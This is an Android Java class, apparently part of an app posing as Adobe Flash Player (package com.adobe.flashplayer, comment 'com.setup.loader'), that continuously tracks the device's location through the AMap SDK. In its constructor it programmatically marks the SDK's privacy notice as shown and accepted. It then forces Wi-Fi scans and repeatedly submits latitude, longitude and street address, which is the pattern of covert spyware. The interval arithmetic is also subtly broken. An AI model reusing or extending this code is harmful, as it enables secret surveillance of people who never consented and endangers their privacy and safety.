package com.adobe.flashplayer.data.Location;


import android.content.Context;
import android.os.Looper;
import android.util.Log;

import com.adobe.flashplayer.data.PhoneLocationListener;
import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationClientOption.AMapLocationMode;
import com.amap.api.location.AMapLocationListener;

//8C:A3:3A:B3:DD:62:AD:9C:71:95:56:B6:C6:71:78:18:E1:56:86:54
//8C:A3:3A:B3:DD:62:AD:9C:71:95:56:B6:C6:71:78:18:E1:56:86:54
//com.setup.loader
public class AMaplocation implements AMapLocationListener,Runnable{

    private String TAG = "[ljg]AMaplocation ";
    //声明mlocationClient对象
    public AMapLocationClient mlocationClient;

    //声明mLocationOption对象
    public AMapLocationClientOption mLocationOption;

    private Context mContext;
    private int mInterval;

    public AMaplocation(Context context,int interval){
        this.mContext = context;
        mInterval = interval*1000;

        AMapLocationClient.updatePrivacyShow(context,true,true);
        AMapLocationClient.updatePrivacyAgree(context,true);
    }

    /**
     * 定位回调监听，当定位完成后调用此方法
     * @param aMapLocation
     */
    @Override
    public void onLocationChanged(AMapLocation amapLocation) {
        if (amapLocation != null) {
            if (amapLocation.getErrorCode() == 0) {

                //定位成功回调信息，设置相关消息
                amapLocation.getLocationType();//获取当前定位结果来源，如网络定位结果，详见定位类型表

                amapLocation.getAccuracy();//获取精度信息

                //String dt = PublicFunction.formatCurrentDate();

                PhoneLocationListener.submitLocation(amapLocation.getLatitude(), amapLocation.getLongitude(),amapLocation.getAddress(), mContext);

            } else {
                //显示错误信息ErrCode是错误码，errInfo是错误信息，详见错误码表。
                Log.e(TAG, "location ErrCode:"+ amapLocation.getErrorCode() + ",errInfo:"+ amapLocation.getErrorInfo());
            }
        }

        if (mInterval <= 0) {
            mlocationClient.stopLocation();
            Looper.myLooper().quitSafely();
        }
    }



    public void stopLocation(){
        if (mlocationClient != null) {
            mlocationClient.stopLocation();
            Looper.myLooper().quitSafely();
        }
    }


    @Override
    public void run() {
        try {
            Looper.prepare();


            //设置定位监听
            mlocationClient = new AMapLocationClient(this.mContext);

            mlocationClient.setLocationListener(this);

            //初始化定位参数
            mLocationOption = new AMapLocationClientOption();

            //设置是否返回地址信息（默认返回地址信息）
            mLocationOption.setNeedAddress(true);

            //设置是否强制刷新WIFI，默认为强制刷新
            mLocationOption.setWifiActiveScan(true);

            //设置是否允许模拟位置,默认为false，不允许模拟位置
            mLocationOption.setMockEnable(false);

            //设置定位模式为高精度模式，Battery_Saving为低功耗模式，Device_Sensors是仅设备模式
            mLocationOption.setLocationMode(AMapLocationMode.Hight_Accuracy);

            if (mInterval > 3600*1000) {
                mInterval = 3600*1000;
            }

            if (mInterval < 0) {
                mInterval = 600*1000;
            }

            if (mInterval <= 0) {
                //设置是否只定位一次,默认为false
                mLocationOption.setOnceLocation(true);
                mLocationOption.setOnceLocationLatest(true);
            }else{
                //设置是否只定位一次,默认为false
                mLocationOption.setOnceLocation(false);
                //设置定位间隔,单位毫秒,默认为2000ms
                mLocationOption.setInterval(mInterval*1000);
            }

            //设置定位参数
            mlocationClient.setLocationOption(mLocationOption);
            // 此方法为每隔固定时间会发起一次定位请求，为了减少电量消耗或网络流量消耗，
            // 注意设置合适的定位时间的间隔（最小间隔支持为1000ms），并且在合适时间调用stopLocation()方法来取消定位请求
            // 在定位结束后，在合适的生命周期调用onDestroy()方法
            // 在单次定位情况下，定位无论成功与否，都无需调用stopLocation()方法移除请求，定位sdk内部会移除
            //启动定位
            mlocationClient.startLocation();

            Looper.loop();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
